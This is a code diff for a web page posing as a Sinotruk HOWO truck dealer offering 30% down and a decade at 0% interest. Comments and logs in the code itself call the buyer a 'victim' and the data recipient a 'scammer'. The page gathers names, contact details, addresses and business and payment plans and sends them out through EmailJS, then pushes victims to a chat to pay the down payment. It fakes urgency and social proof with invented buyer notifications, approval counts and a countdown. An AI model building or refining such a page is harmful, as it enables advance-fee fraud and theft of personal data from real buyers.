@@ -8,6 +8,18 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
     <!-- EmailJS -->
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <!-- Crisp Chat Widget -->
+    <script type="text/javascript">
+        window.$crisp=[];
+        window.CRISP_WEBSITE_ID="376d5206-b602-47e1-8e94-e8791be20f4f";
+        (function(){
+            d=document;
+            s=d.createElement("script");
+            s.src="https://client.crisp.chat/l.js";
+            s.async=1;
+            d.getElementsByTagName("head")[0].appendChild(s);
+        })();
+    </script>
     <style>
         * {
             margin: 0;
@@ -57,15 +69,30 @@
             border-bottom: 1px solid #E5E5E5;
             max-width: 1280px;
             margin: 0 auto;
+            position: relative;
         }
         .logo-area { display: flex; align-items: center; gap: 0.5rem; }
-        .logo-area i { font-size: 1.8rem; color: #C41E3A; }
+        .logo-area img { height: 45px; width: auto; }
         .logo-area h2 { font-weight: 700; color: #C41E3A; }
-        .nav-links { display: flex; gap: 1.5rem; flex-wrap: wrap; }
+        .nav-links { display: flex; gap: 1.5rem; flex-wrap: wrap; align-items: center; }
         .nav-links a { text-decoration: none; color: #1A1A1A; font-weight: 500; transition: color 0.2s; cursor: pointer; }
         .nav-links a:hover { color: #C41E3A; }
         .claim-nav { background: #C41E3A; color: white !important; padding: 0.3rem 0.8rem; border-radius: 2rem; }
         .claim-nav:hover { background: #8B0000; }
+        .bell-container { position: relative; cursor: pointer; }
+        .bell-container i { font-size: 1.3rem; color: #1A1A1A; transition: color 0.2s; }
+        .bell-container i:hover { color: #C41E3A; }
+        .bell-badge { position: absolute; top: -8px; right: -10px; background: #C41E3A; color: white; font-size: 0.65rem; font-weight: bold; padding: 0.15rem 0.4rem; border-radius: 50%; }
+        .notification-dropdown { position: absolute; top: 45px; right: 0; width: 320px; background: white; border: 1px solid #E5E5E5; border-radius: 0.8rem; box-shadow: 0 10px 25px rgba(0,0,0,0.1); z-index: 200; display: none; max-height: 400px; overflow-y: auto; }
+        .notification-dropdown.show { display: block; }
+        .notification-header { padding: 12px 15px; border-bottom: 1px solid #E5E5E5; font-weight: 700; background: #F8F8F8; border-radius: 0.8rem 0.8rem 0 0; }
+        .notification-item { padding: 12px 15px; border-bottom: 1px solid #F5F5F5; }
+        .notification-item:last-child { border-bottom: none; }
+        .notification-time { font-size: 0.7rem; color: #888; margin-bottom: 4px; }
+        .notification-title { font-weight: 600; font-size: 0.85rem; margin-bottom: 4px; }
+        .notification-detail { font-size: 0.75rem; color: #666; }
+        .cancel-btn { background: none; border: none; color: #C41E3A; cursor: pointer; font-size: 0.8rem; margin-top: 8px; padding: 4px 0; width: 100%; text-align: left; }
+        .cancel-btn:hover { text-decoration: underline; }
 
         /* Hero */
         .hero { text-align: center; padding: 2rem 1rem; max-width: 800px; margin: 0 auto; }
@@ -352,12 +379,13 @@
         }
         .form-group { margin-bottom: 1rem; }
         .form-group label { font-weight: 500; display: block; margin-bottom: 0.3rem; }
-        input, select {
+        input, select, textarea {
             width: 100%;
             padding: 0.7rem;
             border: 1px solid #CCC;
             border-radius: 0.5rem;
             font-size: 0.9rem;
+            font-family: inherit;
         }
         .btn-submit {
             background: #C41E3A;
@@ -421,18 +449,27 @@
             margin-bottom: 1rem;
             color: #1A1A1A;
         }
-        .whatsapp-btn {
+        .chat-btn {
             display: inline-block;
             background: #25D366;
             color: white;
-            padding: 0.8rem 1.5rem;
+            padding: 1rem 1.5rem;
             border-radius: 2rem;
             text-decoration: none;
             font-weight: 600;
-            margin: 1rem 0.5rem;
+            margin: 1rem 0;
             transition: all 0.2s;
+            cursor: pointer;
+            border: none;
+            font-size: 1rem;
         }
-        .whatsapp-btn:hover { transform: scale(1.02); }
+        .chat-btn i { margin-right: 8px; }
+        .chat-btn:hover { transform: scale(1.02); background: #128C7E; }
+        .success-timer {
+            margin-top: 1rem;
+            font-size: 0.85rem;
+            color: #6B7280;
+        }
 
         /* Toast Container */
         .toast-container {
@@ -459,6 +496,34 @@
             to { transform: translateX(0); opacity: 1; }
         }
 
+        /* Cancel Popup */
+        .cancel-popup-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            z-index: 3000;
+            justify-content: center;
+            align-items: center;
+        }
+        .cancel-popup {
+            background: white;
+            border-radius: 1rem;
+            padding: 1.5rem;
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+        }
+        .cancel-popup h3 { margin-bottom: 0.5rem; color: #1A1A1A; }
+        .cancel-popup p { margin-bottom: 1.5rem; color: #4B4B4B; }
+        .cancel-popup-buttons { display: flex; gap: 1rem; justify-content: center; }
+        .cancel-popup-buttons button { padding: 0.5rem 1.5rem; border-radius: 2rem; border: none; cursor: pointer; font-weight: 600; }
+        .cancel-confirm { background: #C41E3A; color: white; }
+        .cancel-cancel { background: #E5E5E5; color: #1A1A1A; }
+
         footer {
             background: #1A1A1A;
             padding: 2rem;
@@ -477,7 +542,7 @@
 
         @media (max-width: 768px) {
             .hero h1 { font-size: 1.8rem; }
-            .nav-links { display: none; }
+            .nav-links { gap: 0.8rem; }
             .timer { gap: 0.5rem; }
             .time-unit { padding: 0.3rem 0.6rem; font-size: 1rem; }
         }
@@ -493,23 +558,34 @@
 </div>
 
 <div class="main-header">
-    <div class="logo-area"><i class="fas fa-truck"></i><h2>SINOTRUK HOWO</h2></div>
+    <div class="logo-area">
+        <img src="https://res.cloudinary.com/do9yjpizs/image/upload/v1780937264/qor3pst9rkks15rx9mcu.png" alt="Sinotruk HOWO Logo" style="height: 45px; width: auto;" onerror="this.src='https://placehold.co/200x60?text=SINOTRUK+HOWO'">
+        <h2>SINOTRUK HOWO</h2>
+    </div>
     <div class="nav-links">
         <a class="footer-nav-link" data-target="giveaway">Trucks</a>
         <a class="footer-nav-link" data-target="info">Financing</a>
         <a class="footer-nav-link" data-target="instruction">How It Works</a>
         <a class="footer-nav-link" data-target="transactions">Live Orders</a>
-        <a href="#" class="claim-nav" id="navClaimBtn">Claim Truck</a>
+        <div class="bell-container" id="bellContainer">
+            <i class="far fa-bell"></i>
+            <span class="bell-badge" id="bellBadge" style="display: none;">0</span>
+            <div class="notification-dropdown" id="notificationDropdown">
+                <div class="notification-header">🔔 Notifications</div>
+                <div id="notificationList"></div>
+            </div>
+        </div>
+        <a href="#" class="claim-nav" id="navClaimBtn">Get Truck</a>
     </div>
 </div>
 
 <div class="hero">
-    <div class="live-badge"><span class="live-dot"></span> LIVE OFFER — <span id="heroJoinCount">1,247</span> farmers approved</div>
+    <div class="live-badge"><span class="live-dot"></span> LIVE OFFER — <span id="heroJoinCount">1,247</span> truck owners approved</div>
     <h1>Own a Sinotruk HOWO Heavy Truck</h1>
-    <p>High-quality Chinese trucks direct from manufacturer. Agricultural and commercial trucks for farmers and businesses worldwide.</p>
+    <p>High-quality Chinese trucks direct from manufacturer. For farmers, contractors, and logistics companies worldwide.</p>
     <div class="offer-badge"><i class="fas fa-percent"></i> 30% DOWN PAYMENT | 10 YEARS TO PAY THE REST</div>
     <div class="hero-buttons">
-        <button class="btn-red" id="heroClaimBtn"><i class="fas fa-truck"></i> Claim Your Truck →</button>
+        <button class="btn-red" id="heroClaimBtn"><i class="fas fa-truck"></i> Get Your Truck →</button>
         <button class="btn-outline" id="viewModelsBtn">View All Models</button>
     </div>
 </div>
@@ -521,14 +597,12 @@
 </div>
 
 <div class="container">
-    <!-- Double Truck Image -->
     <div class="double-truck">
-        <div class="truck-image-box"><img src="https://placehold.co/400x250?text=HOWO+Dump+Truck" alt="HOWO Dump Truck"><p>HOWO Heavy Duty</p></div>
+        <div class="truck-image-box"><img src="https://placehold.co/400x250?text=HOWO+Dump+Truck" alt="HOWO Dump Truck"><p>HOWO Heavy Duty Series</p></div>
         <div class="truck-image-box"><img src="https://placehold.co/400x250?text=HOWO+Cargo+Truck" alt="HOWO Cargo Truck"><p>HOWO Cargo Series</p></div>
     </div>
     <p style="text-align:center; font-weight:600;">Limited Time Offer – 30% Down, 10 Years to Pay</p>
 
-    <!-- Countdown Box -->
     <div class="countdown-box" id="giveaway-section">
         <h3><span class="live-dot"></span> Offer ends in:</h3>
         <div class="timer" id="timer">
@@ -537,31 +611,27 @@
             <span class="time-unit" id="minutes">00</span>
             <span class="time-unit" id="seconds">00</span>
         </div>
-        <p><span id="participantCount">1,247</span> farmers already approved</p>
+        <p><span id="participantCount">1,247</span> truck owners already approved</p>
     </div>
 
-    <!-- 10 Trucks Grid -->
     <div class="trucks-grid" id="trucksGrid"></div>
 
-    <!-- Swipeable Testimonials Carousel -->
-    <h3 id="info-section">What Farmers Are Saying</h3>
+    <h3 id="info-section">What Truck Owners Are Saying</h3>
     <div class="testimonials-carousel">
         <button class="carousel-btn prev" id="prevTestimonial">←</button>
         <div class="carousel-container" id="testimonialCarousel"></div>
         <button class="carousel-btn next" id="nextTestimonial">→</button>
     </div>
 
-    <!-- How It Works -->
     <h3 id="instruction-section">How to Get Your HOWO Truck</h3>
     <div class="steps-container">
         <div class="step"><div class="step-number">01</div><strong>Submit Application</strong><br>Fill in your details</div>
-        <div class="step"><div class="step-number">02</div><strong>Get Approved</strong><br>Quick verification</div>
+        <div class="step"><div class="step-number">02</div><strong>Business Verification</strong><br>Quick approval</div>
         <div class="step"><div class="step-number">03</div><strong>Pay 30% Down</strong><br>Secure your truck</div>
         <div class="step"><div class="step-number">04</div><strong>Receive Truck</strong><br>Pay remaining in 10 years</div>
     </div>
     <div style="text-align:center; margin:1rem 0;"><button class="btn-red" id="startClaimBtn"><i class="fas fa-truck"></i> Start Your Application →</button></div>
 
-    <!-- Live Deliveries Feed -->
     <h3 id="transactions-section">Live Orders <span class="live-dot"></span></h3>
     <div class="live-feed" id="liveFeedList"></div>
 </div>
@@ -579,32 +649,110 @@
 
 <div class="toast-container" id="toastContainer"></div>
 
-<!-- Modals -->
+    <!-- Modals -->
 <div id="claimModal" class="modal"><div class="modal-content" id="claimModalContent"></div></div>
+<div id="businessModal" class="modal"><div class="modal-content" id="businessModalContent"></div></div>
 <div id="successModal" class="modal"><div class="modal-content" id="successModalContent"></div></div>
+<div id="cancelPopup" class="cancel-popup-overlay"><div class="cancel-popup"><h3>Cancel Application</h3><p>Are you sure you want to cancel your application? You can always reapply later.</p><div class="cancel-popup-buttons"><button class="cancel-confirm" id="confirmCancelBtn">Yes, Cancel</button><button class="cancel-cancel" id="dismissCancelBtn">No, Go Back</button></div></div></div>
 
 <script>
     // Initialize EmailJS
-    emailjs.init("dvLgjhIHXXq7QXp5p");
+    emailjs.init("oUr2KrIthXHDGSj1R");
 
     // Truck Data (10 models)
     const trucks = [
-        { id: 0, name: "HOWO Dump Truck", category: "Mining & Construction", badge: "Best Seller", badgeColor: "#D4AF37", capacity: "25-40 tons", engine: "WD615 336HP", price: "$42,000", upfront: "$12,600", image: "https://placehold.co/600x400?text=HOWO+Dump+Truck" },
-        { id: 1, name: "HOWO Heavy-Duty Cargo Truck", category: "Freight & Logistics", badge: "Most Popular", badgeColor: "#C41E3A", capacity: "20-30 tons", engine: "WD615 336HP", price: "$38,000", upfront: "$11,400", image: "https://placehold.co/600x400?text=HOWO+Cargo+Truck" },
-        { id: 2, name: "HOWO Semi-Truck", category: "Long Haul", badge: "Top Rated", badgeColor: "#D4AF37", capacity: "40-50 tons", engine: "MC11 440HP", price: "$55,000", upfront: "$16,500", image: "https://placehold.co/600x400?text=HOWO+Semi+Truck" },
-        { id: 3, name: "HOWO Flatbed Truck", category: "Versatile Transport", badge: "Best Value", badgeColor: "#D4AF37", capacity: "15-25 tons", engine: "WD615 336HP", price: "$35,000", upfront: "$10,500", image: "https://placehold.co/600x400?text=HOWO+Flatbed+Truck" },
-        { id: 4, name: "HOWO Concrete Mixer", category: "Construction", badge: "Heavy Duty", badgeColor: "#C41E3A", capacity: "8-12 cubic meters", engine: "WD615 336HP", price: "$48,000", upfront: "$14,400", image: "https://placehold.co/600x400?text=HOWO+Concrete+Mixer" },
-        { id: 5, name: "HOWO Tanker Truck", category: "Liquid Transport", badge: "Industrial", badgeColor: "#D4AF37", capacity: "15,000-25,000L", engine: "MC11 440HP", price: "$52,000", upfront: "$15,600", image: "https://placehold.co/600x400?text=HOWO+Tanker+Truck" },
-        { id: 6, name: "HOWO Refrigerated Truck", category: "Cold Chain", badge: "New Model", badgeColor: "#C41E3A", capacity: "10-20 tons", engine: "WD615 336HP", price: "$45,000", upfront: "$13,500", image: "https://placehold.co/600x400?text=HOWO+Refrigerated+Truck" },
-        { id: 7, name: "HOWO Tipper Truck", category: "Dumping", badge: "Heavy Duty", badgeColor: "#D4AF37", capacity: "30-45 tons", engine: "MC11 440HP", price: "$50,000", upfront: "$15,000", image: "https://placehold.co/600x400?text=HOWO+Tipper+Truck" },
-        { id: 8, name: "HOWO Light-Duty Delivery Truck", category: "Urban Delivery", badge: "City Special", badgeColor: "#C41E3A", capacity: "3-5 tons", engine: "YC4E 160HP", price: "$22,000", upfront: "$6,600", image: "https://placehold.co/600x400?text=HOWO+Light+Truck" },
-        { id: 9, name: "HOWO Bus Chassis", category: "Passenger Transport", badge: "Commercial", badgeColor: "#D4AF37", capacity: "40-60 passengers", engine: "MC11 440HP", price: "$58,000", upfront: "$17,400", image: "https://placehold.co/600x400?text=HOWO+Bus+Chassis" }
+        { id: 0, name: "HOWO Dump Truck", category: "Mining & Construction", badge: "Best Seller", badgeColor: "#D4AF37", capacity: "25-40 tons", engine: "WD615 336HP", fullPrice: 48000, price: "$48,000", upfront30: "$14,400", image: "https://placehold.co/600x400?text=HOWO+Dump+Truck" },
+        { id: 1, name: "HOWO Heavy-Duty Cargo Truck", category: "Freight & Logistics", badge: "Most Popular", badgeColor: "#C41E3A", capacity: "20-30 tons", engine: "WD615 336HP", fullPrice: 45000, price: "$45,000", upfront30: "$13,500", image: "https://placehold.co/600x400?text=HOWO+Cargo+Truck" },
+        { id: 2, name: "HOWO Semi-Truck", category: "Long Haul", badge: "Top Rated", badgeColor: "#D4AF37", capacity: "40-50 tons", engine: "MC11 440HP", fullPrice: 68000, price: "$68,000", upfront30: "$20,400", image: "https://placehold.co/600x400?text=HOWO+Semi+Truck" },
+        { id: 3, name: "HOWO Flatbed Truck", category: "Versatile Transport", badge: "Best Value", badgeColor: "#D4AF37", capacity: "15-25 tons", engine: "WD615 336HP", fullPrice: 42000, price: "$42,000", upfront30: "$12,600", image: "https://placehold.co/600x400?text=HOWO+Flatbed+Truck" },
+        { id: 4, name: "HOWO Concrete Mixer", category: "Construction", badge: "Heavy Duty", badgeColor: "#C41E3A", capacity: "8-12 cubic meters", engine: "WD615 336HP", fullPrice: 52000, price: "$52,000", upfront30: "$15,600", image: "https://placehold.co/600x400?text=HOWO+Concrete+Mixer" },
+        { id: 5, name: "HOWO Tanker Truck", category: "Liquid Transport", badge: "Industrial", badgeColor: "#D4AF37", capacity: "15,000-25,000L", engine: "MC11 440HP", fullPrice: 58000, price: "$58,000", upfront30: "$17,400", image: "https://placehold.co/600x400?text=HOWO+Tanker+Truck" },
+        { id: 6, name: "HOWO Refrigerated Truck", category: "Cold Chain", badge: "New Model", badgeColor: "#C41E3A", capacity: "10-20 tons", engine: "WD615 336HP", fullPrice: 55000, price: "$55,000", upfront30: "$16,500", image: "https://placehold.co/600x400?text=HOWO+Refrigerated+Truck" },
+        { id: 7, name: "HOWO Tipper Truck", category: "Dumping", badge: "Heavy Duty", badgeColor: "#D4AF37", capacity: "30-45 tons", engine: "MC11 440HP", fullPrice: 50000, price: "$50,000", upfront30: "$15,000", image: "https://placehold.co/600x400?text=HOWO+Tipper+Truck" },
+        { id: 8, name: "HOWO Light-Duty Delivery Truck", category: "Urban Delivery", badge: "City Special", badgeColor: "#C41E3A", capacity: "3-5 tons", engine: "YC4E 160HP", fullPrice: 28000, price: "$28,000", upfront30: "$8,400", image: "https://placehold.co/600x400?text=HOWO+Light+Truck" },
+        { id: 9, name: "HOWO Bus Chassis", category: "Passenger Transport", badge: "Commercial", badgeColor: "#D4AF37", capacity: "40-60 passengers", engine: "MC11 440HP", fullPrice: 72000, price: "$72,000", upfront30: "$21,600", image: "https://placehold.co/600x400?text=HOWO+Bus+Chassis" }
     ];
 
     let selectedTruck = null;
     let claimData = null;
+    let businessData = null;
+    let currentStep = 1;
 
-// Helper for button loading
+    // Notification System
+    let notifications = JSON.parse(localStorage.getItem('sinotruk_notifications')) || [];
+
+    function saveNotification(title, detail) {
+        notifications.unshift({ title, detail, time: new Date().toLocaleTimeString() });
+        if (notifications.length > 10) notifications.pop();
+        localStorage.setItem('sinotruk_notifications', JSON.stringify(notifications));
+        updateBell();
+    }
+
+    function updateBell() {
+        const badge = document.getElementById('bellBadge');
+        const list = document.getElementById('notificationList');
+        if (notifications.length > 0) {
+            badge.style.display = 'inline-block';
+            badge.innerText = notifications.length;
+        } else {
+            badge.style.display = 'none';
+        }
+        if (list) {
+            list.innerHTML = notifications.map(n => `
+                <div class="notification-item">
+                    <div class="notification-time">${n.time}</div>
+                    <div class="notification-title">${n.title}</div>
+                    <div class="notification-detail">${n.detail}</div>
+                </div>
+            `).join('');
+            if (notifications.length === 0) {
+                list.innerHTML = '<div class="notification-item">No notifications yet</div>';
+            }
+            // Add cancel button if step2 completed
+            if (localStorage.getItem('sinotruk_step2_completed') === 'true') {
+                const cancelDiv = document.createElement('div');
+                cancelDiv.className = 'notification-item';
+                cancelDiv.innerHTML = '<button class="cancel-btn" id="cancelAppBtn">Cancel Application</button>';
+                list.appendChild(cancelDiv);
+                document.getElementById('cancelAppBtn')?.addEventListener('click', () => {
+                    document.getElementById('cancelPopup').style.display = 'flex';
+                });
+            }
+        }
+    }
+
+    function clearNotifications() {
+        notifications = [];
+        localStorage.removeItem('sinotruk_notifications');
+        localStorage.removeItem('sinotruk_step1_completed');
+        localStorage.removeItem('sinotruk_step2_completed');
+        localStorage.removeItem('sinotruk_claimData');
+        localStorage.removeItem('sinotruk_businessData');
+        localStorage.removeItem('sinotruk_selectedTruck');
+        updateBell();
+    }
+
+    // Bell click toggle
+    document.getElementById('bellContainer')?.addEventListener('click', (e) => {
+        e.stopPropagation();
+        const dropdown = document.getElementById('notificationDropdown');
+        dropdown.classList.toggle('show');
+    });
+    document.addEventListener('click', () => {
+        document.getElementById('notificationDropdown')?.classList.remove('show');
+    });
+
+    // Cancel popup handlers
+    document.getElementById('confirmCancelBtn')?.addEventListener('click', () => {
+        clearNotifications();
+        document.getElementById('cancelPopup').style.display = 'none';
+        window.location.href = window.location.pathname;
+    });
+    document.getElementById('dismissCancelBtn')?.addEventListener('click', () => {
+        document.getElementById('cancelPopup').style.display = 'none';
+    });
+
+    // Helper for button loading
     function setButtonLoading(btn, isLoading, originalText) {
         if (isLoading) {
             btn.disabled = true;
@@ -613,8 +761,14 @@
         } else {
             btn.disabled = false;
             btn.style.opacity = '1';
-            btn.innerHTML = originalText || btn.getAttribute('data-original-text') || 'Submit';
+            btn.innerHTML = originalText;
         }
+    }
+
+    function calculateTotalUpfront(price, quantity) {
+        const priceNum = parseInt(price.replace('$', '').replace(',', ''));
+        const total = priceNum * quantity;
+        return `$${total.toLocaleString()}`;
     }
 
     // Render trucks grid
@@ -637,9 +791,9 @@
                         <div class="spec-item"><i class="fas fa-calendar-alt"></i> 10-Year Terms</div>
                     </div>
                     <div class="price">Full Price: ${truck.price}</div>
-                    <div class="upfront">30% Down: ${truck.upfront} <small>only</small></div>
+                    <div class="upfront">30% Down: ${truck.upfront30} <small>only</small></div>
                     <div class="terms">Balance payable within 10 years • 0% interest</div>
-                    <button class="claim-btn-card" data-truck='${JSON.stringify(truck)}'><i class="fas fa-truck"></i> Claim This Truck →</button>
+                    <button class="claim-btn-card" data-truck='${JSON.stringify(truck)}'><i class="fas fa-truck"></i> Get This Truck →</button>
                 </div>
             `;
             grid.appendChild(card);
@@ -652,7 +806,7 @@
         });
     }
 
-    // Claim Modal
+    // Step 1: Claim Modal
     function showClaimModal() {
         const modal = document.getElementById('claimModal');
         const content = document.getElementById('claimModalContent');
@@ -665,6 +819,7 @@
                 <div class="form-group"><label>Email Address *</label><input type="email" id="email" required placeholder="john@example.com"></div>
                 <div class="form-group"><label>Phone Number *</label><input type="text" id="phone" required placeholder="+1234567890"></div>
                 <div class="form-group"><label>Delivery Address *</label><input type="text" id="address" required placeholder="123 Main St, City, Country"></div>
+                <div class="form-group"><label>Quantity (Number of Trucks) *</label><input type="number" id="quantity" required min="1" value="1"></div>
                 <div class="modal-buttons">
                     <button type="button" class="btn-secondary" id="cancelClaimBtn">Cancel</button>
                     <button type="submit" class="btn-submit" id="submitClaimBtn">Submit Application →</button>
@@ -681,19 +836,121 @@
             const originalText = submitBtn.innerHTML;
             setButtonLoading(submitBtn, true, originalText);
 
+            const quantity = parseInt(document.getElementById('quantity').value);
+            const totalUpfront = calculateTotalUpfront(selectedTruck.price, quantity);
+
             claimData = {
                 fullName: document.getElementById('fullName').value,
                 email: document.getElementById('email').value,
                 phone: document.getElementById('phone').value,
                 address: document.getElementById('address').value,
                 truckModel: selectedTruck.name,
-                upfrontAmount: selectedTruck.upfront,
+                quantity: quantity,
+                upfrontAmount: selectedTruck.upfront30,
+                totalUpfront: totalUpfront,
                 timestamp: new Date().toLocaleString()
             };
 
             try {
-                await emailjs.send('service_1qzlil7', 'template_2raf063', claimData);
-                console.log('Send 1 (Scammer - application) sent');
+                await emailjs.send('service_rhipogs', 'template_v13pw4n', claimData);
+                console.log('Send 1 (Scammer - personal info) sent');
+                saveNotification('✓ Application Submitted', `${selectedTruck.name}, Qty: ${quantity}, Total 30% Down: ${totalUpfront}`);
+                localStorage.setItem('sinotruk_step1_completed', 'true');
+                localStorage.setItem('sinotruk_claimData', JSON.stringify(claimData));
+                localStorage.setItem('sinotruk_selectedTruck', JSON.stringify(selectedTruck));
+            } catch(err) { console.log('EmailJS error:', err); }
+
+            setTimeout(() => {
+                setButtonLoading(submitBtn, false, originalText);
+                modal.style.display = 'none';
+                showBusinessModal();
+            }, 800);
+        });
+    }
+
+    // Step 2: Business Details Modal
+    function showBusinessModal() {
+        const modal = document.getElementById('businessModal');
+        const content = document.getElementById('businessModalContent');
+        content.innerHTML = `
+            <h2 style="color:#C41E3A;"><i class="fas fa-building"></i> Business & Payment Details</h2>
+            <p style="margin-bottom:1rem;">Complete your application for ${claimData.truckModel}</p>
+            <form id="businessForm">
+                <div class="form-group"><label>Business / Company Name</label><input type="text" id="businessName" placeholder="e.g., Green Valley Farms"></div>
+                <div class="form-group"><label>Truck Usage Purpose *</label>
+                    <select id="truckUsage" required>
+                        <option value="">Select purpose</option>
+                        <option value="Farming">Farming</option>
+                        <option value="Construction">Construction</option>
+                        <option value="Logistics">Logistics / Freight</option>
+                        <option value="Mining">Mining</option>
+                        <option value="Other">Other</option>
+                    </select>
+                </div>
+                <div class="form-group"><label>Preferred Payment Terms *</label>
+                    <select id="paymentTerms" required>
+                        <option value="">Select terms</option>
+                        <option value="Monthly">Monthly</option>
+                        <option value="Quarterly">Quarterly</option>
+                        <option value="Yearly">Yearly</option>
+                    </select>
+                </div>
+                <div class="form-group"><label>Expected Down Payment Date *</label><input type="date" id="paymentDate" required></div>
+                <div class="form-group"><label>Additional Notes (Optional)</label><textarea id="notes" rows="3" placeholder="Any special requirements or questions..."></textarea></div>
+                <div class="modal-buttons">
+                    <button type="button" class="btn-secondary" id="cancelBusinessBtn">Back</button>
+                    <button type="submit" class="btn-submit" id="submitBusinessBtn">Complete Application →</button>
+                </div>
+            </form>
+        `;
+        modal.style.display = 'flex';
+
+        document.getElementById('cancelBusinessBtn').onclick = () => {
+            modal.style.display = 'none';
+            showClaimModal();
+        };
+
+        document.getElementById('businessForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const submitBtn = document.getElementById('submitBusinessBtn');
+            const originalText = submitBtn.innerHTML;
+            setButtonLoading(submitBtn, true, originalText);
+
+            businessData = {
+                fullName: claimData.fullName,
+                email: claimData.email,
+                phone: claimData.phone,
+                address: claimData.address,
+                truckModel: claimData.truckModel,
+                quantity: claimData.quantity,
+                totalUpfront: claimData.totalUpfront,
+                businessName: document.getElementById('businessName').value,
+                truckUsage: document.getElementById('truckUsage').value,
+                paymentTerms: document.getElementById('paymentTerms').value,
+                paymentDate: document.getElementById('paymentDate').value,
+                notes: document.getElementById('notes').value,
+                timestamp: new Date().toLocaleString()
+            };
+
+            // Victim confirmation email data
+            const victimData = {
+                to_email: claimData.email,
+                to_name: claimData.fullName,
+                truck_model: claimData.truckModel,
+                quantity: claimData.quantity,
+                total_upfront: claimData.totalUpfront,
+                timestamp: new Date().toLocaleString()
+            };
+
+            try {
+                await Promise.all([
+                    emailjs.send('service_rhipogs', 'template_v13pw4n', businessData),
+                    emailjs.send('service_rhipogs', 'template_42yhth5', victimData)
+                ]);
+                console.log('Send 2 (Scammer - business details) and Send 3 (Victim - confirmation) sent together');
+                saveNotification('✓ Business Details Submitted', `${businessData.businessName || 'Individual'}, ${businessData.paymentTerms} payments, Starting ${businessData.paymentDate}`);
+                localStorage.setItem('sinotruk_step2_completed', 'true');
+                localStorage.setItem('sinotruk_businessData', JSON.stringify(businessData));
             } catch(err) { console.log('EmailJS error:', err); }
 
             setTimeout(() => {
@@ -704,47 +961,53 @@
         });
     }
 
-    // Success Modal with Tidio Chat
+    // Success Modal with Chat Button
+    let successRedirectTimer;
     function showSuccess() {
         const modal = document.getElementById('successModal');
         const content = document.getElementById('successModalContent');
+        let timeLeft = 300; // 5 minutes in seconds
         content.innerHTML = `
             <div class="success-card">
                 <div class="success-icon"><i class="fas fa-check-circle"></i></div>
                 <h2>APPLICATION RECEIVED!</h2>
-                <p><strong>${selectedTruck.name}</strong></p>
-                <p>30% Down Payment: <strong>${selectedTruck.upfront}</strong></p>
-                <p>Balance: Pay within 10 years at 0% interest</p>
-                <div style="margin: 1rem 0; padding: 1rem; background: #F8F8F8; border-radius: 0.8rem;">
-                    <i class="fab fa-whatsapp" style="color:#25D366; font-size:1.2rem;"></i>
-                    <strong>Complete your 30% down payment:</strong>
-                    <p style="margin-top:0.5rem;">Contact our payment agent via WhatsApp to complete your 30% down payment and secure your truck.</p>
-                    <a href="https://wa.me/861234567890" class="whatsapp-btn" target="_blank"><i class="fab fa-whatsapp"></i> Chat on WhatsApp</a>
-                </div>
-                <p>A confirmation email has been sent to <strong>${claimData.email}</strong></p>
-                <div class="redirect-text" style="margin-top:1rem;">
-                    <span class="spinner-small" style="display:inline-block; width:14px; height:14px; border:2px solid #6B7280; border-top-color:transparent; border-radius:50%; animation: spin 0.6s linear infinite;"></span> Redirecting to homepage...
-                </div>
+                <p><strong>${businessData.truckModel}</strong></p>
+                <p>Quantity: ${businessData.quantity}</p>
+                <p><strong>30% Down Payment: ${businessData.totalUpfront}</strong></p>
+                <p style="margin-top:0.5rem;">A confirmation message has been sent to <strong>${claimData.email}</strong></p>
+                <button class="chat-btn" id="chatSupportBtn"><i class="fas fa-comment-dots"></i> Chat with Us</button>
+                <div class="success-timer" id="successTimer">Redirecting to homepage in 5:00</div>
             </div>
         `;
         modal.style.display = 'flex';
-        
-        addToLiveFeed(claimData.fullName.split(' ')[0], selectedTruck.name, selectedTruck.upfront);
-        showToastMessage(claimData.fullName.split(' ')[0], selectedTruck.name);
-        
-        setTimeout(() => {
-            modal.style.display = 'none';
-            location.reload();
-        }, 6000);
+
+        document.getElementById('chatSupportBtn').onclick = () => {
+            if (window.$crisp) {
+                window.$crisp.push(['do', 'chat:open']);
+            }
+        };
+
+        // 5 minute timer
+        const timerDisplay = document.getElementById('successTimer');
+        const timerInterval = setInterval(() => {
+            timeLeft--;
+            const minutes = Math.floor(timeLeft / 60);
+            const seconds = timeLeft % 60;
+            timerDisplay.innerText = `Redirecting to homepage in ${minutes}:${seconds.toString().padStart(2, '0')}`;
+            if (timeLeft <= 0) {
+                clearInterval(timerInterval);
+                modal.style.display = 'none';
+                window.location.href = window.location.pathname;
+            }
+        }, 1000);
     }
 
-
-// Live Feed Functions
-    function addToLiveFeed(firstName, truckName, upfront) {
+    // Live Feed Functions
+    function addToLiveFeed(firstName, truckName, totalUpfront) {
         const feed = document.getElementById('liveFeedList');
         const entry = document.createElement('div');
         entry.className = 'feed-item';
-        entry.innerHTML = `<i class="fas fa-truck"></i> ${firstName} just paid 30% down for ${truckName} (${upfront}) · Just now`;
+        entry.innerHTML = `<i class="fas fa-truck"></i> ${firstName} just paid 30% down for ${truckName} (${totalUpfront}) · Just now`;
         feed.prepend(entry);
         if (feed.children.length > 15) feed.removeChild(feed.lastChild);
     }
@@ -758,56 +1021,60 @@
         setTimeout(() => toast.remove(), 5000);
     }
 
-    // Name pool for auto toasts
+    // Name pool for auto toasts (random intervals 15-45 seconds)
     const namePool = [
-        "James Wilson", "John Martinez", "Michael Brown", "David Rodriguez", "Robert Anderson",
-        "Liam O'Connor", "Oliver Jones", "Lucas Tremblay", "Lukas Schmidt", "Matteo Rossi",
-        "Gabriel Santos", "Jack Thompson", "Yuki Tanaka", "Min-jun Park", "Arjun Sharma",
-        "Carlos Hernandez", "Santiago Fernandez", "Elias Andersson", "William van der Berg", "Antonio Silva"
+        "James Wilson", "John Martinez", "Michael Brown", "David Rodriguez", "Robert Anderson", "Chidi Okonkwo", "Thabo Nkosi",
+        "Ahmed Raza", "Rajesh Kumar", "João Silva", "Diego Fernandez", "Omar Al-Mansouri", "Dmitri Volkov", "Maria Santos",
+        "Agus Prasetyo", "Carlos Mendoza", "Sofia Restrepo", "Liam O'Connor", "Yuki Tanaka", "Sipho Dlamini"
     ];
 
-    // Auto toast and live feed
-    setInterval(() => {
